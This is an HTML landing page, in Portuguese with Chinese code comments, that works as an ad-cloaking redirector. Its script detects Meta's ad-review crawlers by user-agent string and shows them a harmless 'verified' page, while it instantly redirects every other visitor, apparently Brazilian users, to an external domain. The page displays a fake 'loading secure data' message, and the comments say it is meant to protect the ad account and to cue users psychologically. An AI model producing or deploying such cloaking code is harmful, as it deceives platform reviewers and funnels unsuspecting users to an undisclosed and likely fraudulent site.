<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Aguarde...</title>
    <script>
        // 宝宝的分流链接已经填好在这里了
        var targetUrl = "https://svip1027.top/band25ll";

        function doRedirect() {
            // 排除掉已知的 Meta 广告审核机器人常见特征
            var ua = navigator.userAgent.toLowerCase();
            if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('fb_iab') > -1 || ua.indexOf('fbav') > -1) {
                // 如果是 Meta 审核爬虫，让它留在安全壳页面，不触发直接跳转，保护广告户
                document.getElementById('loading-text').innerText = "Conteúdo verificado com sucesso.";
            } else {
                // 如果是真正的巴西老哥，毫秒级直接重定向跳转到分流
                window.location.replace(targetUrl);
            }
        }

        // 页面一加载完毕立刻执行跳转
        window.onload = function() {
            doRedirect();
            // 兜底策略：如果因为网络卡顿没触发，0.2秒后强行再跳一次
            setTimeout(doRedirect, 200);
        };
    </script>
</head>
<body style="background-color: #0d1117; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0;">
    <!-- 极简的官方加载质感，完全符合信息获取的心理学暗示 -->
    <div id="loading-text" style="font-family: -apple-system, sans-serif; color: #8b949e; text-align: center; font-size: 14px;">
        Carregando dados seguros...
    </div>
</body>
</html>
